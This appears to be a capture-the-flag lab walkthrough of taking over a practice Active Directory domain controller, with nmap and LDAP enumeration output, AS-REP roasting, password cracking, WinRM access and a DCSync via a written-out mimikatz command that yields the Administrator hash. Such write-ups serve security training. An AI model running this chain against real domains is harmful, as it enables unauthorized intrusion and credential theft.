First enumeration with nmap

```shell
# Nmap 7.94 scan initiated Sat Aug 19 13:27:16 2023 as: nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn 10.150.150.66
Nmap scan report for 10.150.150.66
Host is up (0.15s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49680/tcp open  unknown
49691/tcp open  unknown
50131/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Aug 19 13:29:27 2023 -- 1 IP address (1 host up) scanned in 131.57 seconds
```
running nmap full for scan to get available ports, let's run nmap default scripts to know the service running on those port.

```shell
# Nmap 7.94 scan initiated Sat Aug 19 13:33:04 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49672,49675,49680,49691,50131 -Pn 10.150.150.66
Nmap scan report for 10.150.150.66
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-19 12:33:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DOOMOPS.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DOOMOPS.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
50131/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-DOOMOPS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-19T12:34:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 19 13:34:45 2023 -- 1 IP address (1 host up) scanned in 101.88 seconds
```
cool we know what services are running on those port.

![[Pasted image 20230819133659.png]]
using cme to get the name of the domain. we can see `DOOMOPS.LOCAL`. add it to our `/etc/hosts` file.

## Enumerating smb 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/10.150.150.66]
└─$ smbclient -L //10.150.150.66/                          
Password for [WORKGROUP\n16hth4wk]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.150.150.66 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
using smbclient to check for anonymous available shares, there are no share available to use anonymously.


## Enumerating ldap 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/10.150.150.66]
└─$ ldapsearch -x -H ldap://10.150.150.66 -b 'DC=doomops,DC=local'
# extended LDIF
#
# LDAPv3
# base <DC=doomops,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# DOOMOPS.LOCAL
dn: DC=DOOMOPS,DC=LOCAL

# Administrator, Users, DOOMOPS.LOCAL
dn: CN=Administrator,CN=Users,DC=DOOMOPS,DC=LOCAL

# Guest, Users, DOOMOPS.LOCAL
dn: CN=Guest,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022184558.0Z
whenChanged: 20201022184558.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=DOOMOPS,DC=LOCAL
uSNChanged: 8197
name: Guest
objectGUID:: Jy8q59nNskq8f3G3pUN53A==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxE9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022184644.0Z
dSCorePropagationData: 16010101181633.0Z

# krbtgt, Users, DOOMOPS.LOCAL
dn: CN=krbtgt,CN=Users,DC=DOOMOPS,DC=LOCAL

# Revenant, Users, DOOMOPS.LOCAL
dn: CN=Revenant,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Revenant
description: FLAG4=ce262e730c845a312541d0545f77fbec
givenName: Revenant
distinguishedName: CN=Revenant,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190427.0Z
whenChanged: 20220420152547.0Z
displayName: Revenant
uSNCreated: 16427
memberOf: CN=Remote Management Users,CN=Builtin,DC=DOOMOPS,DC=LOCAL
uSNChanged: 57374
name: Revenant
objectGUID:: UBjypY8Fk0yecHzGJlZ5dg==
userAccountControl: 4260352
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132482156380241850
pwdLastSet: 132478670676904230
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxETwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: revenant
sAMAccountType: 805306368
userPrincipalName: revenant@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190427.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132857681563051008
msDS-SupportedEncryptionTypes: 0

# Cacodemon, Users, DOOMOPS.LOCAL
dn: CN=Cacodemon,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Cacodemon
givenName: Cacodemon
distinguishedName: CN=Cacodemon,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190500.0Z
whenChanged: 20201022190500.0Z
displayName: Cacodemon
uSNCreated: 16436
uSNChanged: 16441
name: Cacodemon
objectGUID:: Iv/1cbEJ2Umdk1Oi317J7A==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478671004555913
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cacodemon
sAMAccountType: 805306368
userPrincipalName: cacodemon@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190500.0Z
dSCorePropagationData: 16010101000417.0Z

# Cyberdemon, Users, DOOMOPS.LOCAL
dn: CN=Cyberdemon,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Cyberdemon
givenName: Cyberdemon
distinguishedName: CN=Cyberdemon,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190538.0Z
whenChanged: 20210721095918.0Z
displayName: Cyberdemon
uSNCreated: 16443
memberOf: CN=Remote Management Users,CN=Builtin,DC=DOOMOPS,DC=LOCAL
uSNChanged: 28742
name: Cyberdemon
objectGUID:: H8CJH7qXiUuBoUz+2PK98g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478671389240642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cyberdemon
sAMAccountType: 805306368
userPrincipalName: cyberdemon@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190538.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132713351581708454

# Spectre, Users, DOOMOPS.LOCAL
dn: CN=Spectre,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Spectre
givenName: Spectre
distinguishedName: CN=Spectre,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190611.0Z
whenChanged: 20201022190612.0Z
displayName: Spectre
uSNCreated: 16452
uSNChanged: 16458
name: Spectre
objectGUID:: FP17RR1fKUyoIwBSNeQzDA==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478671719551905
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: spectre
sAMAccountType: 805306368
userPrincipalName: spectre@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190611.0Z
dSCorePropagationData: 16010101000417.0Z

# Macubus, Users, DOOMOPS.LOCAL
dn: CN=Macubus,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Macubus
givenName: Macubus
distinguishedName: CN=Macubus,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190643.0Z
whenChanged: 20201022190643.0Z
displayName: Macubus
uSNCreated: 16460
uSNChanged: 16466
name: Macubus
objectGUID:: cMlLAZ4oqk+dlvY0kJ2hGg==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478672032680903
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: mancubus
sAMAccountType: 805306368
userPrincipalName: mancubus@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190643.0Z
dSCorePropagationData: 16010101000417.0Z

# Hellhound, Users, DOOMOPS.LOCAL
dn: CN=Hellhound,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Hellhound
givenName: Hellhound
distinguishedName: CN=Hellhound,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190721.0Z
whenChanged: 20201022190721.0Z
displayName: Hellhound
uSNCreated: 16468
uSNChanged: 16474
name: Hellhound
objectGUID:: wzuUZJgZcUqWaIYohhXwPA==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478672411278020
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: hellhound
sAMAccountType: 805306368
userPrincipalName: hellhound@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190721.0Z
dSCorePropagationData: 16010101000417.0Z

# Spiderdemon, Users, DOOMOPS.LOCAL
dn: CN=Spiderdemon,CN=Users,DC=DOOMOPS,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Spiderdemon
givenName: Spiderdemon
distinguishedName: CN=Spiderdemon,CN=Users,DC=DOOMOPS,DC=LOCAL
instanceType: 4
whenCreated: 20201022190753.0Z
whenChanged: 20201022190754.0Z
displayName: Spiderdemon
uSNCreated: 16476
uSNChanged: 16482
name: Spiderdemon
objectGUID:: nUlS4rurckiRsX2iYGFbSQ==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132478672738302651
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAATAjY4aRMgELPkxEVQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: spiderdemon
sAMAccountType: 805306368
userPrincipalName: spiderdemon@DOOMOPS.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=DOOMOPS,DC=LOCAL
dSCorePropagationData: 20201022192325.0Z
dSCorePropagationData: 20201022191313.0Z
dSCorePropagationData: 20201022190753.0Z
dSCorePropagationData: 16010101000417.0Z

# search reference
ref: ldap://ForestDnsZones.DOOMOPS.LOCAL/DC=ForestDnsZones,DC=DOOMOPS,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.DOOMOPS.LOCAL/DC=DomainDnsZones,DC=DOOMOPS,DC=LOCAL

# search reference
ref: ldap://DOOMOPS.LOCAL/CN=Configuration,DC=DOOMOPS,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 15
# numEntries: 11
# numReferences: 3
```
using ldapsearch to enumerate ldap if we can get username, and we got some usernames.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD/10.150.150.66]
└─$ cat ldapenum.txt | grep -i "sAMAccountName" | cut -d ":" -f 2
 Guest
 revenant
 cacodemon
 cyberdemon
 spectre
 mancubus
 hellhound
 spiderdemon
```
cool we got the usernames. let's put it in a file

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/53f5073a-fd5e-4882-81e7-34bb431656ea)

using `impacket-GetNPUser` to get preauth token key, we got the hash key for user `revenant`. let's crack with hashcat.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b04e52d0-b18e-4b45-8af6-396568cec918)

cracked the hash using hashcat. and the password is `doomhammer211*`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2c431e6d-a84f-4509-b7cb-b90ebe4579d4)

using crackmapexec to check what service we have access to, we can see we have access to `winrm`. let's login winrm

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1523f5eb-b499-4624-8192-4835bb62ad45)

cool we are in, let's escalate privilege.


## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6df6d9f5-0121-4458-9fb0-e831f18e7acc)

running winpeas.exe, we can see a password for user `cyberdemon`. `cyberdemon:Ocz%F972q%eU`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b0aece8e-6a08-487d-8778-5873dda0b0fb)

using crackmapexec to check what service we have access to, we can see we have winrm.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/57b70dc7-607c-4dc1-b1ba-f3a5637d0e73)

cool we are in as `cyberdemon`. . let's collect data with sharphound and view with bloodhound 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eb50187c-51e5-4fe5-ba12-4ad37f9f8677)

using bloodhound to enumerate futher to check for user with advance privilege, we can see user `cyberdemon` has `DCSync` privilege. let's perform dcsync attack.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2a56bbf3-b0d8-4f43-961e-8bf239ff038a)

we got administrator hash using mimikatz command. `lsadump::dcsync /domain:doomops.local /user:Administrator`.
```
Administrator:9e4e2dac5807fb745533e0dda18bfbf6
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/088c4cab-5aca-4cec-aac7-7b65b137b990)

using crackmapexec to check for what service we have session to, we can see we have session to winrm.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/09a34acb-a532-48d7-afd4-4a4dd8e0972c)

Bankai!!! we got Administrator. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3d9385f7-992b-4bdf-8db7-1195f34b3446)

And we are through 😜 easy box huh.
